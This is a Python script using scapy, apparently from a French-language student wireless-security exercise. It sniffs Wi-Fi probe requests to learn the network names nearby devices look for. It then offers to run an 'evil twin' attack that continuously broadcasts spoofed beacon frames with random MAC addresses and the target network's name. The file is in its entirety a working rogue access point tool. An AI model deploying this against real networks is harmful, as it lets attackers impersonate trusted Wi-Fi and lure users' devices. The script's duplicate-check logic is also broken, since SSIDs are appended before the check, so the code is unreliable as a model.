#!/usr/bin/env python3 
# TODO : J'arrive toujours pas a kill le processus avec une interruption..

import argparse
from faker import Faker

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq

################## Passing arguments ##################
parser = argparse.ArgumentParser(prog="Scapy Detection of Probe Request and possiblity to start an evil tween",
                                 usage="%(prog)s -i wlan0mon",
                                 description="Scapy Detection of Probe Request and possiblity to start an evil tween",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")

parser.add_argument("-t", "--Timeout", required=False,
                    help="The time in secondes how long we will scan for STA, default is 30", default=30)                 

args = parser.parse_args()

####################################
################## variables ##################

IFACE_NAME = args.Interface
timeout = args.Timeout
BROADCAST = "ff:ff:ff:ff:ff:ff"
sta_list = []
ssid_list = []

# Si jamais l'interface est down
#os.system("ifconfig %s up" % IFACE_NAME)
#Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
#p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])

####################################
################## fonctions ##################

def PacketHandler(pkt):
    # On récupère les Probe request 
    if pkt.haslayer(Dot11ProbeReq):

        # Vérifier que les infos sont disponibles
        if pkt.haslayer(Dot11Elt):

            # On récupère l'adresse de la station qui est l'adresse source
            sta = pkt.addr2
            # On récupère le SSID du packet 
            ssid = pkt.info.decode('utf-8')

            ssid_list.append(ssid)

            # Verification des doublons et que le SSID et celui qu'on veut
            if ssid not in ssid_list:
                ssid_list.append(ssid)
                print("STA (%s) is looking for the SSID (%s)" % (sta, ssid))

    elif pkt.haslayer(Dot11Beacon): # SI c'est une trame beacon 

        #Vérifier que les infos existent
        if pkt.haslayer(Dot11Elt):

            SSID = pkt.info.decode("utf-8")

            # On vérifie si le ssid se trouve dans le tableau des ssid recherchés 
            # par une STA
            if SSID in ssid_list:
                print("We found an existing SSID nearby %s" % SSID)
                # On demande si on veut lancer un evil tween avec le SSID trouvé
                user_input = input("Would you make an evil tween ? (y/n) \n")
                if user_input == "y":
                    evil_tween(SSID)
                else:
                    exit(1)

def evil_tween(ssid):
    faker = Faker()

    #Préparation de la frame à envoyer#
    #envoi de la frame en broadcast, la MAC src et la MAC de l'AP sont les mêmes et valeurs bidons
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=faker.mac_address(), addr3=faker.mac_address()) 
    #Permet à l'AP d'apparaître comme sécurisé
    beacon = Dot11Beacon(cap='ESS+privacy')
    #SSID de l'AP à spoof
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

    #build de la frame (on a décider de ne pas utiliser de Robust Secure Network (RSN)
    # car ce n'est pas nécessaire pour un entrainement comme ceci)
    frame = RadioTap()/dot11/beacon/essid

    #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
    sendp(frame, iface=IFACE_NAME, inter=0.100, loop=1) 
    
####################################
################## main ##################

sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)









